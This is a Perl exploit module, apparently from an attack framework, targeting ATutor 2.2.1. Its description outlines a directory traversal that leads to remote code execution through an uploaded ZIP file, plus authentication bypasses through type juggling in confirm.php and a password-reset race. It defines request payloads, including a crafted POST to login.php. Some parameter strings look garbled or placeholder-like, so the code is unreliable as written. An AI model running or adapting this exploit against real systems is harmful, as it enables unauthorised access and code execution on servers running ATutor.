package ATUTOR::MSF::AtutorFilemanagerTraversal;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "AtutorFilemanagerTraversal";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

         This module exploits a directory traversal vulnerability in ATutor on an Apache/PHP

         setup with display_errors set to On, which can be used to allow us to upload a malicious

         ZIP file. On the web application, a blacklist verification is performed before extraction,

         however it is not sufficient to prevent exploitation.



         You are required to login to the target to reach the vulnerability, however this can be

         done as a student account and remote registration is enabled by default.



         Just in case remote registration isn't enabled, this module uses 2 vulnerabilities

         in order to bypass the authentication:



         1. confirm.php Authentication Bypass Type Juggling vulnerability

         2. password_reminder.php Remote Password Reset TOCTOU vulnerability

      ",
  METHOD      => "POST",
  MSF_MODULE  => "atutor_filemanager_traversal",
  PATH        => "h=&e=__E__&#thebruteforceid=&m=&thatitwillbe1member_id=1&",
  PATHS       => ["ATutor/"],
  PAYLOAD     => "auto_login=&code=0#typejuggling&",
  REFERENCES  => [
                   "http://www.atutor.ca/",
                   "http://sourceincite.com/research/src-2016-09/",
                   "http://sourceincite.com/research/src-2016-10/",
                   "http://sourceincite.com/research/src-2016-11/",
                   "https://github.com/atutor/ATutor/pull/107",
                 ],
  TITLE       => "ATutor 2.2.1 Directory Traversal / Remote Code Execution",
  VARIABLES => {
    'E' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The path of Atutor", VALUE => "/ATutor/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'login.php',
      PAYLOAD      => 'form_password_hidden=8b891b2893ed75e69beee290ade9df6197cadf23&form_login=__USERNAME__&submit=Login&token=',
      TEXT   => 'Sending Exploit #3 Request : [POST] /login.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
